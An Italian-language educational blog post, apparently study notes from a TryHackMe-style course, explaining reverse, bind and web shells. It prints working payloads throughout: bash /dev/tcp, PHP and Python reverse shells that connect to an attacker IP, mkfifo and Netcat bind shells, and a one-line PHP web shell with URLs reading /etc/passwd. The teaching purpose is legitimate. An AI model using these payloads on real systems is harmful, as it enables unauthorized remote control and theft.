---
title: "Shells"
date: 2026-08-18 08:00:00 +0200
categories: [Cyber Security 101]
tags: [offensive-security-tooling, shells]
description: ""
toc: true
---
## Intro

Una shell è un software che permette a un utente di interagire con un sistema operativo. Può essere un'interfaccia grafica, ma solitamente è un'interfaccia a riga di comando — dipende dal sistema operativo in esecuzione sulla macchina target.

In ambito cybersecurity, il termine si riferisce comunemente a una sessione shell specifica che un attaccante usa quando accede a un sistema compromesso, permettendogli di eseguire comandi e software. Questo permette all'attaccante di svolgere diverse attività:

- **Controllo remoto del sistema** — eseguire comandi o software da remoto sul sistema target
- **Privilege Escalation** — se l'accesso iniziale ottenuto tramite la shell è limitato, cercare modi per elevare i propri privilegi a un accesso più alto o amministrativo
- **Esfiltrazione di dati** — esplorare il sistema per leggere e copiare dati sensibili
- **Persistenza e mantenimento dell'accesso** — creare accessi tramite utenti e credenziali, o copiare software backdoor per mantenere l'accesso al sistema per un uso successivo
- **Attività di post-exploitation** — installare malware, creare account nascosti, eliminare informazioni
- **Accesso ad altri sistemi nella rete** — usare la shell ottenuta come punto di partenza per muoversi lateralmente verso altri target nella stessa rete, tecnica nota come **pivoting**

A un livello più alto, quando si tratta di sfruttare un target siamo interessati a due tipi di shell: reverse shell e bind shell. A queste si aggiunge una terza modalità, la web shell, utile quando le prime due non sono praticabili.

## Reverse Shell

Una reverse shell è una tecnica in cui la connessione viene avviata dal sistema target verso la macchina dell'attaccante, il che può aiutare a evitare il rilevamento da parte dei firewall di rete.

### Impostare un listener Netcat (nc)

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```

- **`-l`** — indica a Netcat di ascoltare/attendere una connessione
- **`-v`** — abilita la modalità verbose
- **`-n`** — impedisce alle connessioni di usare il DNS per la risoluzione dei nomi, quindi non risolverà nessun hostname, userà direttamente un indirizzo IP
- **`-p`** — indica la porta che verrà usata per attendere la connessione (in questo caso, la 443)

### Ottenere l'accesso alla reverse shell

Una volta impostato il listener, l'attaccante esegue quello che è noto come **reverse shell payload**. Questo payload solitamente sfrutta una vulnerabilità o un accesso non autorizzato ottenuto dall'attaccante, ed esegue un comando che espone la shell attraverso la rete. Esistono diversi payload, a seconda degli strumenti e del sistema operativo del sistema compromesso.

### L'attaccante riceve la shell

Una volta eseguito il payload, l'attaccante riceve una reverse shell, come mostrato di seguito, che gli permette di eseguire comandi come se stesse effettuando il login in un normale terminale del sistema operativo.

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

## Bind Shell

Come indica il nome, una bind shell apre una porta sul sistema compromesso e resta in ascolto per una connessione; quando questa connessione avviene, espone la sessione shell in modo che l'attaccante possa eseguire comandi da remoto.

Questo metodo può essere usato quando il target compromesso non permette connessioni in uscita, ma tende a essere meno popolare perché deve restare attivo e in ascolto di connessioni, il che può portare al rilevamento.

### Impostare la bind shell sul target

Una volta eseguito il comando, il target resta in attesa di una connessione in ingresso.

### L'attaccante si connette alla bind shell

Ora che la macchina di laboratorio è in attesa di connessioni in ingresso, possiamo usare di nuovo Netcat con il seguente comando per connetterci.

```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

### Esempi di payload per bind shell

**Netcat con l'opzione `-e`** (se disponibile sulla versione installata sul target — molte build moderne la rimuovono per motivi di sicurezza):

```bash
target@tryhackme:~$ nc -lvnp 8080 -e /bin/bash
```

Il target resta in ascolto sulla porta 8080 e, appena riceve una connessione, collega direttamente uno shell (`/bin/bash`) a quella connessione.

**Bash puro, tramite named pipe** (funziona anche quando `nc -e` non è disponibile):

```bash
target@tryhackme:~$ mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

`mkfifo` crea una named pipe in `/tmp/f`, usata come "ponte" tra l'input che arriva da Netcat e l'output di `/bin/sh`, che viene rimandato indietro nella stessa pipe — un modo per costruire una bind shell interattiva senza bisogno del flag `-e`.

**Bash, sfruttando `/dev/tcp` in modalità bind** (nessun listener esterno, tutto gestito dal file descriptor):

```bash
target@tryhackme:~$ while true; do nc -lvnp 8080 -c '/bin/bash -i'; done
```

Variante che rilancia automaticamente il listener dopo ogni connessione chiusa, utile per bind shell pensate per restare disponibili più a lungo.

**Python:**

```python
target@tryhackme:~$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",8080));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

`s.bind()` e `s.listen()` mettono il socket in ascolto sulla porta 8080 direttamente sul target, invece di connettersi verso un attaccante come nella reverse shell; `s.accept()` attende la connessione in arrivo, poi la logica di collegamento a stdin/stdout/stderr è la stessa vista per la reverse shell in Python.

### Shell payload — il concetto alla base di entrambe

Un Shell Payload è un comando o script che espone una shell in una delle due modalità viste sopra. La reverse shell è generalmente preferita in pentest reali perché bypassa più facilmente i firewall — molte reti bloccano connessioni in entrata (che servirebbero per una bind shell) ma lasciano passare connessioni in uscita verso Internet (che è quello che fa una reverse shell).

Un esempio classico di payload per reverse shell in bash:

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

- `bash -i` — avvia bash in modalità interattiva
- `>& /dev/tcp/10.10.10.10/4444` — bash tratta `/dev/tcp/IP/PORTA` come uno pseudo-file speciale che apre una connessione TCP verso quell'IP/porta; `>&` reindirizza sia stdout che stderr verso quella connessione
- `0>&1` — reindirizza anche stdin (`0`) verso dove punta ora stdout (`1`), cioè la connessione di rete — così è possibile anche scrivere comandi, non solo vederne l'output

**Variante bash con file descriptor 196** (utile quando il target ha un bash minimale che non gestisce bene sequenze di comandi separate da `;`):

```bash
exec 196<>/dev/tcp/10.10.10.10/4444 && sh <&196 >&196 2>&196
```

`exec 196<>/dev/tcp/...` apre il file descriptor 196 come connessione TCP bidirezionale, e solo se questo ha successo (`&&`) lancia `sh` agganciato a quel descrittore.

**PHP, usando la funzione `exec`:**

```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

`fsockopen()` apre una connessione socket verso l'attaccante (PHP le assegna automaticamente il file descriptor `3`); `exec()` lancia una shell interattiva collegandone input/output/errori a quel file descriptor.

**Python, esportando le variabili d'ambiente:**

```bash
export RHOST="10.10.10.10";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Impostare IP e porta come variabili d'ambiente (invece di scriverle direttamente nel codice) è utile per riusare lo stesso payload cambiando solo le variabili. `os.dup2()` duplica il file descriptor del socket su stdin, stdout e stderr, collegando l'intera shell alla connessione di rete; `pty.spawn("sh")` avvia una vera shell interattiva (pseudo-terminale) — lo stesso comando usato per stabilizzare una shell già ottenuta.

**Python, usando il modulo `subprocess`** (alternativa a `pty`, spesso disponibile anche su installazioni Python minimali):

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Tutti i payload di questo tipo fanno concettualmente la stessa cosa: aprono una connessione di rete e ci agganciano sopra input/output di una shell — cambia solo il linguaggio (bash, PHP, Python...) e la tecnica specifica usata, a seconda di cosa è disponibile/eseguibile sul sistema target.

## Web Shell

A differenza delle reverse/bind shell, che aprono una connessione di rete diretta, una web shell è uno script malevolo caricato su un server web, scritto nello stesso linguaggio del backend dell'applicazione (PHP, ASP, JSP, ecc.), che permette all'attaccante di eseguire comandi sul sistema tramite normali richieste HTTP, semplicemente visitando quella pagina dal browser o con curl.

### La differenza chiave rispetto a una reverse/bind shell

| | Reverse/Bind Shell | Web Shell |
|---|---|---|
| Come si accede | Connessione di rete diretta (TCP) | Richieste HTTP/HTTPS normali |
| Serve un listener attivo | Sì, sulla macchina attaccante | No — il "server" è la web shell stessa, sempre lì finché il file esiste |
| Persistenza | Si perde se la connessione cade | Resta finché il file non viene rimosso dal server |
| Visibilità nel traffico | Traffico su porte/protocolli insoliti | Si mimetizza nel normale traffico HTTP verso il sito |

### Come funziona in pratica

Una web shell minimale in PHP può essere semplice come:

```php
<?php system($_GET['cmd']); ?>
```

- `$_GET['cmd']` — legge il parametro `cmd` dall'URL
- `system()` — esegue quel valore come comando di sistema

Una volta caricata sul server (es. come `shell.php`), l'attaccante la usa così:

```
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
```

Ogni richiesta HTTP esegue un comando diverso — è come avere un terminale, ma "spalmato" su richieste web separate invece che su una sessione continua.

### Perché sono particolarmente pericolose — la persistenza

A differenza di una reverse shell, che richiede all'attaccante di essere "presente" con un listener attivo nel momento dell'exploit, una web shell resta silenziosamente sul server anche dopo che l'attaccante si disconnette — la può riusare giorni o settimane dopo, semplicemente rivisitando l'URL. Per questo, in un'ottica di persistenza, è spesso più insidiosa di una reverse shell "usa e getta".

## Un limite importante da conoscere

Reverse e bind shell sono una tecnica essenziale per ottenere esecuzione di codice remota su una macchina, ma non saranno mai complete quanto una shell nativa (es. una vera sessione SSH): mancano spesso di job control, autocompletamento, e stabilità — è per questo che, una volta ottenuto l'accesso iniziale, conviene sempre stabilizzare la shell o, quando possibile, escalare verso un metodo di accesso più "normale" (come una chiave SSH valida).

## Utilizzo

Reverse shell, bind shell e web shell rispondono tutte alla stessa esigenza — eseguire comandi da remoto su un sistema compromesso — ma si adattano a scenari di rete diversi. La reverse shell resta la scelta più comune perché aggira le restrizioni tipiche dei firewall in ingresso; la bind shell si usa quando il target non permette connessioni in uscita, accettando il compromesso di restare esposta e più rilevabile; la web shell è l'opzione da considerare quando l'accesso avviene tramite un'applicazione web con funzionalità di upload, e offre il vantaggio della persistenza rispetto alle prime due.
